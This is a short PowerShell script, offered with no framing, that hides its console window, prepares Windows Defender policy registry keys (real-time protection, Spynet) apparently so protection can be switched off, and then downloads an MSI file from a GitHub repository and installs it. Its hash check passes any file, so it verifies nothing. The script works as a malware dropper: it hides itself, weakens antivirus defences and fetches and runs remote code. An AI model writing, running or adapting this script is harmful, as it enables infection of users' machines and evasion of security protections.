# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}
# --- Config ---
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"
$SignatureUpdatesKey   = "Signature Updates"
$SpynetKey             = "Spynet"

$base = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$rt   = "$base\Real-Time Protection"
$spy  = "$base\Spynet"

foreach ($p in @($base, $rt, $spy)) {
    if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
}




$url="https://github.com/analysisw/test/raw/refs/heads/main/merged.msi"; $file="$env:USERPROFILE\Downloads\merged.msi"; Invoke-WebRequest $url -OutFile $file; if ((Get-FileHash $file -Algorithm SHA256).Hash) { Start-Process msiexec.exe -ArgumentList "/i `"$file`"" }
